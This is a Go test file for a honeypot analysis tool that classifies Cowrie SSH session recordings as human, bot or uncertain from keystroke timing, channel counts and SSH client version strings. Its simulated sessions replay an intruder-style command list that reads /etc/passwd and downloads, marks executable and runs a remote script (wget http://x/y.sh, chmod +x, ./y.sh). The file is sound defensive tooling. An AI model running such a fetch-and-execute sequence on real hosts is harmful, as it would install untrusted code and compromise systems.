package verdict

import (
	"bytes"
	"encoding/binary"
	"os"
	"slices"
	"testing"
	"time"

	"github.com/devleesch001/cauri/internal/ttylog"
)

var t0 = time.Date(2026, 10, 14, 9, 0, 0, 0, time.UTC)

// record encodes a ttylog record at t0 + at.
func record(op, dir int32, at time.Duration, data string) []byte {
	ts := t0.Add(at)
	h := []any{op, uint32(0), int32(len(data)), dir, uint32(ts.Unix()), uint32(ts.Nanosecond() / 1000)}
	var b bytes.Buffer
	for _, v := range h {
		_ = binary.Write(&b, binary.LittleEndian, v)
	}
	b.WriteString(data)
	return b.Bytes()
}

// session builds a recording: an opening, then the given input records.
type input struct {
	at   time.Duration
	data string
}

func typing(t *testing.T, inputs []input) *Typing {
	t.Helper()
	parts := [][]byte{record(ttylog.OpOpen, 0, 0, "")}
	for _, in := range inputs {
		parts = append(parts, record(ttylog.OpWrite, ttylog.DirInput, in.at, in.data),
			record(ttylog.OpWrite, ttylog.DirOutput, in.at, in.data))
	}
	ty, err := ReadTyping(bytes.NewReader(bytes.Join(parts, nil)))
	if err != nil {
		t.Fatal(err)
	}
	return &ty
}

// typed types lines key by key; gap gives the delay before each key, pause
// the delay after each Enter.
func typed(lines []string, gap func(i int) time.Duration, pause func(i int) time.Duration) []input {
	var out []input
	at, k := time.Second, 0
	for l, line := range lines {
		for _, r := range line + "\r" {
			at += gap(k)
			k++
			out = append(out, input{at, string(r)})
		}
		at += pause(l)
	}
	return out
}

func codes(r Result) []string {
	var c []string
	for _, reason := range r.Reasons {
		c = append(c, reason.Code)
	}
	return c
}

var lines = []string{"uname -a", "cat /etc/passwd", "cd /tmp", "wget http://x/y.sh", "chmod +x y.sh", "./y.sh"}

// keyGaps cycles through intervals between keys as measured on real
// interactive sessions: a median around 150 ms, with hesitations
// (coefficient of variation about 0.9).
func keyGaps(i int) time.Duration {
	ms := []int{110, 150, 95, 420, 140, 80, 160, 650, 120, 135, 90, 230}
	return time.Duration(ms[i%len(ms)]) * time.Millisecond
}

func TestRealScriptedSession(t *testing.T) {
	f, err := os.Open("../ttylog/testdata/cowrie-v3.1.2.tty")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = f.Close() }()
	ty, err := ReadTyping(f)
	if err != nil {
		t.Fatal(err)
	}
	r := Judge(Facts{Terminal: true, Commands: 4, ClientVersion: "SSH-2.0-Go"}, &ty)
	want := []string{WholeLines, ConstantDelay, AutomationLibrary}
	if r.Verdict != Bot || r.Score != -5 || !slices.Equal(codes(r), want) {
		t.Fatalf("result = %+v", r)
	}
}

func TestHuman(t *testing.T) {
	in := typed(lines, keyGaps,
		func(i int) time.Duration {
			return []time.Duration{900, 2500, 600, 4000, 1200, 700}[i] * time.Millisecond
		})
	// A typo corrected with backspace, and Tab completion.
	in = append(in, input{in[len(in)-1].at + time.Second, "x"}, input{in[len(in)-1].at + 1200*time.Millisecond, "\x7f"},
		input{in[len(in)-1].at + 1500*time.Millisecond, "\t"})
	r := Judge(Facts{Terminal: true, Commands: len(lines), ClientVersion: "SSH-2.0-OpenSSH_9.6"}, typing(t, in))
	want := []string{KeyByKey, IrregularTyping, HumanTypingSpeed, EditsCommands, IrregularPauses}
	if r.Verdict != Human || r.Score != 7 || !slices.Equal(codes(r), want) {
		t.Fatalf("result = %+v", r)
	}
}

// A human pasting whole lines looks like a script on that signal: the
// verdict stays uncertain rather than wrong.
func TestHumanPasting(t *testing.T) {
	var in []input
	at := time.Second
	for i, line := range lines {
		at += []time.Duration{900, 2500, 600, 4000, 1200, 700}[i] * time.Millisecond
		in = append(in, input{at, line + "\r"})
	}
	r := Judge(Facts{Terminal: true, Commands: len(lines), ClientVersion: "SSH-2.0-OpenSSH_9.6"}, typing(t, in))
	if r.Verdict != Uncertain {
		t.Fatalf("result = %+v", r)
	}
}

// A bot simulating typing at a constant pace: key-by-key typing (+2) is
// outweighed by the mechanical rhythm (-2) and constant delays (-2); with
// an OpenSSH client that makes -2, uncertain, and a bot with a library
// client.
func TestBotSimulatingTyping(t *testing.T) {
	in := typed(lines, func(int) time.Duration { return 50 * time.Millisecond },
		func(int) time.Duration { return 300 * time.Millisecond })
	r := Judge(Facts{Terminal: true, Commands: len(lines), ClientVersion: "SSH-2.0-OpenSSH_9.6"}, typing(t, in))
	want := []string{KeyByKey, MechanicalTyping, ConstantDelay}
	if r.Verdict != Uncertain || r.Score != -2 || !slices.Equal(codes(r), want) {
		t.Fatalf("OpenSSH client: result = %+v", r)
	}
	r = Judge(Facts{Terminal: true, Commands: len(lines), ClientVersion: "SSH-2.0-paramiko_3.4.0"}, typing(t, in))
	if r.Verdict != Bot || r.Score != -3 {
		t.Fatalf("library client: result = %+v", r)
	}
}

func TestWithoutRecording(t *testing.T) {
	exec := Judge(Facts{Terminal: false, Commands: 3, ClientVersion: "SSH-2.0-libssh_0.9.6"}, nil)
	if exec.Verdict != Bot || exec.Score != -3 || !slices.Equal(codes(exec), []string{NoTerminal, AutomationLibrary}) {
		t.Errorf("exec = %+v", exec)
	}
	none := Judge(Facts{ClientVersion: "SSH-2.0-OpenSSH_9.6"}, nil)
	if none.Verdict != NoInteraction || none.Score != 0 {
		t.Errorf("no interaction = %+v", none)
	}
}

// A human holds one shell channel; each further one (an exec, an isolated
// shell) counts against a human, up to a ceiling.
func TestManyChannels(t *testing.T) {
	base := Facts{Terminal: true, Commands: 6, ClientVersion: "SSH-2.0-OpenSSH_9.6"}
	for channels, want := range map[int]int{0: 0, 1: 0, 2: -1, 4: -3, 7: -6, 50: -6} {
		f := base
		f.Channels = channels
		res := Judge(f, nil)
		if res.Score != want {
			t.Errorf("%d channels: score %d, want %d", channels, res.Score, want)
		}
		if got := slices.Contains(codes(res), ManyChannels); got != (want != 0) {
			t.Errorf("%d channels: reason present = %v", channels, got)
		}
	}
	// A bot running a command per channel, as in session 360c0aaa5fe0.
	f := base
	f.Channels, f.ClientVersion = 6, "SSH-2.0-libssh_0.9.6"
	if res := Judge(f, nil); res.Verdict != Bot || res.Score != -6 {
		t.Errorf("libssh bot = %+v", res)
	}
}

func TestAutomationClient(t *testing.T) {
	for version, want := range map[string]bool{
		"SSH-2.0-Go": true, "SSH-2.0-libssh_0.9.6": true, "SSH-2.0-libssh2_1.10.0": true,
		"SSH-2.0-paramiko_3.4.0": true, "SSH-2.0-AsyncSSH_2.14.0": true, "SSH-2.0-JSCH-0.1.54": true,
		"SSH-2.0-OpenSSH_9.6": false, "SSH-2.0-PuTTY_Release_0.81": false, "SSH-2.0-Gopher": false, "": false,
	} {
		if automationClient.MatchString(version) != want {
			t.Errorf("%q: want %v", version, want)
		}
	}
}

func TestKeys(t *testing.T) {
	for data, want := range map[string]bool{"a": true, "\x1b[A": true, "é": true, "ls\r": false, "ab": false} {
		if singleKey([]byte(data)) != want {
			t.Errorf("singleKey(%q) != %v", data, want)
		}
	}
	if n := edits([]byte("ab\x7f\t\x1b[D\x1b[Zc\x03")); n != 4 {
		t.Errorf("edits = %d, want 4", n)
	}
}

func FuzzReadTyping(f *testing.F) {
	real, err := os.ReadFile("../ttylog/testdata/cowrie-v3.1.2.tty")
	if err != nil {
		f.Fatal(err)
	}
	f.Add(real)
	f.Add(record(ttylog.OpWrite, ttylog.DirInput, 0, "\x1b"))
	f.Fuzz(func(t *testing.T, data []byte) {
		ty, err := ReadTyping(bytes.NewReader(data))
		if err != nil {
			return
		}
		if len(ty.KeyGaps) > maxSamples || len(ty.Pauses) > maxSamples {
			t.Fatal("samples not bounded")
		}
		_ = Judge(Facts{Terminal: true, Commands: 1}, &ty)
	})
}

// Recordings written by the official cowrie/cowrie image: shells start
// with a prompt and record what is typed, exec channels write their
// command whole and not their standard input.
func TestShell(t *testing.T) {
	for file, want := range map[string]bool{
		"../ttylog/testdata/cowrie-v3.1.2.tty":                                                                       true,  // typed at the prompt
		"../ttylog/testdata/cowrie-56b2abb-shell-piped.tty":                                                          true,  // printf 'id\nexit\n' | ssh -T host
		"../ttylog/testdata/cowrie-56b2abb-exec-stdin.tty":                                                           false, // printf 'uname -a\nwhoami\n' | ssh host 'bash -s'
		"../ingest/testdata/cowrie-v3.1.2-exec-tty/28ba533b0f3c4df63d6b4a5ead73860697bdf735bb353e4ca928474889eb8a15": false, // ssh host 'uname -a'
	} {
		f, err := os.Open(file)
		if err != nil {
			t.Fatal(err)
		}
		ty, err := ReadTyping(f)
		_ = f.Close()
		if err != nil {
			t.Fatal(err)
		}
		if ty.Shell() != want {
			t.Errorf("%s: shell = %v, want %v (%+v)", file, ty.Shell(), want, ty)
		}
	}
	// A shell opened and left without typing tells nothing.
	ty, err := ReadTyping(bytes.NewReader(record(ttylog.OpWrite, ttylog.DirOutput, 0, "root@svr04:~# ")))
	if err != nil || ty.Shell() {
		t.Errorf("prompt only: %+v, %v", ty, err)
	}
}
